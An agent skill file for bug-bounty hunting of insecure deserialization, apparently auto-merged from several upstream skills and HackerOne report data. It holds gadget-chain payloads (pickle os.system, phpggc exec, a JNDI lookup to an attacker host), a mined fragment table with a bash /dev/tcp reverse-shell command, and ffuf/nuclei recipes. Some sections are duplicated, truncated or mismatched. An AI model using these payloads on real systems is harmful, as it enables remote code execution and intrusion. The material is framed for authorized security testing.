---
name: bbhunt-deserialization
description: "Use for serialized objects in cookies, tokens, parameters, files or messages where attacker-controlled data reaches a deserializer. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Insecure Deserialization — unified methodology

> **Unified skill.** Built from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Corpus-backed method (this class)

1. Fingerprint the language/framework and identify the serialization format used for state.
2. Locate serialized values the user can influence: cookies, hidden fields, tokens, uploaded files, queue messages.
3. Determine whether integrity is enforced (HMAC/signature) and whether a key is exposed elsewhere.
4. Identify available gadgets for that stack and library versions; use the smallest reliable gadget.
5. Prove a security-relevant effect (command execution, file read, auth flag change) with a callback or bounded observation.

### Signals

- Java `rO0`, PHP `O:`, .NET BinaryFormatter, Ruby Marshal, Python pickle patterns
- Signed-only (not encrypted) object cookies
- Gadget-chain libraries present in the stack

### Kill criteria

- Signed and unforgeable with no key exposure.
- No controllable serialized input reaches a deserializer.
- Gadget requires an unavailable library/version.

### Escalation chains

- Deserialization -> RCE -> internal access.
- Object injection -> auth flag change -> privilege escalation.

### Veteran tip

The operator's field notes: identify the language first, then the serialization grammar, then choose the gadget — never blind-fire payloads.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Look for serialized blobs: Java, PHP, Python pickle, .NET, Ruby Marshal, YAML.
- Decode cookies/params; identify magic bytes (rO0, a:, 8004, etc.).
- Test gadget chains in an authorized, controlled way.
- Check integrity/signature validation and key management.
- Look at queues, caches, and session stores.

### Deeper checklist

- Look for serialized blobs: Java, PHP, Python pickle, .NET, Ruby Marshal, YAML.
- Decode cookies/params and identify magic bytes and object structure.
- Test gadget chains with ysoserial/phpggc in a safe, authorized manner.
- Check integrity/signature validation and key management.
- Look for deserialization in message queues, caches, and session stores.
- Demonstrate a controlled impact (DNS callback or command execution).

### A. Discovery checklist — concrete places, params, headers, file types to look

- Inventory every value that round-trips through the server and could be a serialized object: session cookies, `rememberMe`, `__VIEWSTATE`, hidden form fields, `state`/`token`/`data`/`job`/`queue`/`cache` params, and any base64-looking blob in a header or JSON body.
- Fingerprint by magic bytes before crafting anything: Java serialized streams start `AC ED 00 05` (hex) / `rO0` (base64); PHP objects look like `O:8:"stdClass":0:{}`; Python pickle starts `\x80\x04` or `\x80\x02`; .NET BinaryFormatter payloads start with `AAEAAAD/////`.
- Check `Content-Type: application/x-java-serialized-object`, `application/octet-stream`, and endpoints under `/remoting/`, `/invoker/`, `/jmx-console/`, `/wls-wsat/`, `/webservices/`.
- Apache Shiro: look for a `rememberMe=` cookie and test with the default AES key before assuming a custom key.
- Log4Shell-style JNDI sinks: test *all* user-controlled fields, not just login — `User-Agent`, `X-Forwarded-For`, `Referer`, `X-Api-Version`, `Accept-Language`, JSON body values, filename/import metadata.
- PHP phar:// surface: any file-upload endpoint plus any later filesystem call on an attacker-influenced path (`file_exists`, `filesize`, `getimagesize`, `is_readable`, `include`) is a candidate — no explicit `unserialize()` in the code required.
- 2025-2026 advisories to pattern-match: OpenMage LTS GHSA-fg79-cr9c-7369 (CVE-2026-25524) — ICO/phar JPEG polyglot uploads reaching `getimagesize()` → RCE; connect.8x8.com (H1, 2026, $3,000) — Jint→Newtonsoft `TypeNameHandling`

### Signals and surfaces

### Signal

- Reports: **93** · paid: **27**
- Median bounty **$600** · p90 **$4,500** · max **$10,000** · total **$50,091**
- Median upvotes **16**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitHub Security Lab | 6 | $17,100 | 57 |
| Pornhub | 1 | $10,000 | 271 |
| Internet Bug Bounty | 22 | $8,323 | 217 |
| Aiven Ltd | 1 | $5,000 | 45 |
| 8x8 | 2 | $3,000 | 85 |
| Vanilla | 4 | $2,100 | 120 |
| RubyGems | 2 | $1,500 | 79 |
| Acronis | 1 | $1,000 | 76 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`cookie` `session` `token` `state` `data` `job` `queue` `cache`

### Crown Jewel Targets

Deserialization bugs are almost always Critical — they lead directly to RCE without prerequisite conditions.

**Highest-value chains:**
- **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
- **PHP Object Injection** — `__wakeup` / `__destruct` magic methods → file write / RCE
- **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE
- **Ruby Marshal.load** — Gem::Requirement, Gem::Installer gadgets → RCE
- **JNDI injection** — Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE

---

### Header / Cookie Signals

```
Content-Type: application/x-java-serialized-object
Cookie containing rO0= prefix (Java base64 serialized)
Cookie: rememberMe= (Apache Shiro)
Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)
Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
```

---

### Techniques, payloads and bypasses

### Payloads & probes

- Java -> `rO0AB...` + ysoserial gadget
- PHP -> `O:8:"stdClass":...`
- Python -> `cos\nsystem\n(S'id'\ntR.` pickle
- Ruby -> `\x04\b[` Marshal

### Bypass tricks

- Signed cookies with a weak/known key.
- Filter bypass via encoding or nested serialization.
- Use DNS/HTTP callbacks to confirm gadget execution.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Attacker can add arbitrary data to the blockchain without paying gas** — `#396954` · Rootstock Labs · $0 · ▲258
  > https://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/org/ethereum/core/Transaction.java L242
- **Account takeover via insecure intent handling** — `#2516732` · Basecamp · $0 · ▲136
  > By installing a malicious app on the same device where the Basecamp app is logged in, the attacker could obtain the Oauth2 token of the user logged in and take over his account.
- **SQL Injection + Insecure Deserialization leads to Remote Code Execution on https://krisp.ai** — `#1842674` · Krisp · $0 · ▲119
  > [tenweb-speed-optimizer](https://wordpress.org/plugins/tenweb-speed-optimizer/) wordpress plugin by [10web.io](https://10web.io/), prior to 2.12.22 version was vulnerable to UNAUTHENTICATED SQL injection (in `/wp-json/tenwebio/v2/compress-one`) which could be…
- **Unsafe deserialization leads to token leakage in PayPal & PayPal for Business [Android]** — `#453791` · PayPal · $0 · ▲93
  > https://blog.oversecured.com/Exploiting-memory-corruption-vulnerabilities-on-Android/
- **Authenticated Code Execution through Phar deserialization in CSV Importer as Shop manager in WooCommerce** — `#403083` · Automattic · $0 · ▲84
  > I only displayed the contents of the /etc/passwd file in the PoC video.
- **RCE on Wordpress website** — `#2248328` · Nextcloud · $0 · ▲83
  > https://github.com/nextcloud/nextcloud-theme/b

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 3× | `$templates` |
| 3× | `__proto__` |
| 2× | `$cache` |
| 2× | `curl -v \ / --proxy https://127.0.0.1:18443 --proxy-insecure \ / --hsts ./hsts-cache.txt \ / http://hsts-probe.test:18080/` |
| 2× | `cf_ssl_is_alive()` |
| 1× | `system('id')` |
| 1× | `$_COOKIE['nc_form_fields']` |
| 1× | `${jdni:ldap://nps.acronis.com.<your-server>/test}` |
| 1× | `ZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */ / { / zend_object *zobj; / zobj = Z_OBJ_P(object); / if (!zobj` |
| 1× | `curl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:"GMP":106:{s:1:"5"%3ba:2:{s:5:"cache"%3ba:1:{s:5:"index"%3bs:14:"{${phpinfo()}}"%3b}i:0%3bO:12` |
| 1× | `Gem::Package.new(body).spec` |
| 1× | `PS C:\>ysoserial.net\ysoserial\bin\Release\ysoserial.exe -p DotNetNuke -m read_file -f C:\Windows\win.ini` |
| 1× | `java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1` |
| 1× | `\\| Packet type (` |
| 1× | `\\|$$$$$$$$$$$$\\|*************\\|@@@@@@@@@@@@\\|%%%%%%%%%\\|` |
| 1× | `$$$$$$$$$$$$*************@@@@@@@@@@@@%%%%%%%%%` |
| 1× | `\\|$$$$$$$$$$$$*************\\|@@@@@@@@@@@@\\|%%%%%%%%%\\|` |
| 1× | `POST /daip/messagebroker/amf HTTP/1.1 / Host: www.███████ / Connection: close / Accept-Encoding: gzip, deflate / Accept: */* / User-Agent: p` |
| 1× | `script.py <collaborator> 80` |
| 1× | `❯ RUBYGEMS_PROXY=true rackup / Puma starting in single mode... / * Puma version: 5.2.2 (ruby 2.7.1-p83) ("Fettisdags

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Universal Java detection chains first, before any library-specific guess: `URLDNS` triggers a DNS lookup for a supplied URL and works on any Java version with no vulnerable dependency; `JRMPClient` forces a TCP connection (use a raw IP). For firewalled egress, send one payload with a local IP (instant response) and one with a blocked external IP (hang) — the timing delta proves deserialization in blind cases.
- Java 16+ ysoserial invocation needs `--add-opens` flags (e.g. `java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED`, `java.base/java.util=ALL-UNNAMED`); older one-liners silently fail.
- Modern Java reality check: JDK 16+ strong module encapsulation breaks most classic CommonsBeanutils chains; GadgetBuilder (Nordsec 2025) reactivated 85% of ysoserial payloads and added 29 main chains, with sink adapters such as `FileOutputStream` (file write) and `URL.getContent()` (SSRF/NTLM reflection).
- Property/type tampering before gadget hunting: flip `isAdmin` `b:0`→`b:1` in a PHP session object; exploit PHP loose comparisons by supplying integer `0` where a string password is expected (`0 == "Example string"` is true on PHP 7.x, false on PHP 8+, but `5 == "5 of something"` remains true). Remember to update all type labels and length indicators.
- PHPGGC workflow: `./phpggc -l` to list chains, `phpggc Symfony/RCE4 exec 'id' | base64`, then re-sign the cookie. PortSwigger's pre-built-chain lab leaks `SECRET_KEY` via `/cgi-bin/phpinfo.php` and rebuilds the cookie as `urlencode('{"token

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

# HUNT-DESERIALIZATION — Insecure Deserialization

### Validation

✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
✅ Command output in response: full RCE confirmed

**Severity:** Almost always **Critical** — RCE with server process privileges.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- A DNS/HTTP callback from `URLDNS` or an OOB gadget proves *deserialization occurred* — it does not prove RCE. Escalate to a command output or a callback emitted from inside the executed command before claiming Critical.
- An exception change after tampering is only a lead; it can be a length/type validation error. Confirm with a universal detection chain.
- For signed cookies, a modified cookie that returns a signature error means the signing check is active — recover the key (debug endpoint, source disclosure, default key) before claiming anything.
- Validate the whole chain end-to-end: payload generated → encoded correctly (base64 + URL-encode where required) → accepted → magic method fired → sink reached. A generation tool succeeding is not evidence the target is vulnerable.
- Blind timing detection (JRMPClient local vs firewalled IP) must be repeated at least 3× with stable deltas; a single slow response is noise.
- When a chain fails, distinguish "wrong library/version" from "no deserialization" by re-testing with `URLDNS` — if that also fails, the entry point is not a deserialization sink.
- Severity: deserialization reaching `id`/OOB command execution is almost always Critical; object-type injection with only a privilege/cookie-state change is High; detection-only callback is Medium and should be described as confirmed deserialization, not RCE.

**Language-specific sink checklist (verify each before moving on):**
- Java: `ObjectInputStream.readObject()`, `readResolve()`, `readObjectNoData()`,

### Validation

✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
✅ Command output in response: full RCE confirmed

**Severity:** Almost always **Critical** — RCE with server process privileges.

### Escalation and related chains

### Escalation chains

- Deserialization -> RCE.
- Deserialization -> auth bypass.

### Attacker can add arbitrary data to the blockchain without paying gas

`#396954` · Rootstock Labs · $0 · critical · 2019-09-18 · ▲258
> Summary: Due to a missing sanity check in Transaction::rlpParse, an attacker can append arbitrary RLP-encoded data to the end of an otherwise valid transaction, and that data will not only pass through validation, but also be propagated throug the network and mined into a block. Since the block parser uses the same code for decoding transactions (as it should), the block will also be conidered valid.

### Chain Table

| Deserialization signal | Chain to | Impact |
|-----------------------|----------|--------|
| Any deser RCE | /etc/passwd + id output | Prove arbitrary command execution |
| RCE as low-privilege user | Find SUID binaries / sudo rules | Privilege escalation → root |
| Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
| Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |

---

### Tools and wordlists

### Tools

`ysoserial` · `phpggc` · `marshalsec` · `Burp` · `interactsh`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_deserialization.txt` | 76 |
| `~/.local/share/hackerone-reports/wordlists/params_deserialization.txt` | 5 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_deserialization.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_deserialization.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Scanner coverage is thin; decode cookies/tokens and identify the serialization format manually.

```sh
nuclei -u https://target -tags deserialization \
       -severity low,medium,high,critical -rl 40 -o nuclei_deserialization.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/other \
       -rl 40 -o nuclei_deserialization_other.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Source skills merged into this topic

- `h1skills` — `hackerone-deserialization`
- `hunting` — `deserialization`
- `cbh` — `hunt-deserialization`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/upstream-assets/` — 2 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
- `../../upstream/` — complete unmodified archives of all five source repositories
- `references/evidence.md` — corpus technique frequencies, parameters, case studies and payload bank
- `bbhunt-methodology` — orchestrator, state machine and class router
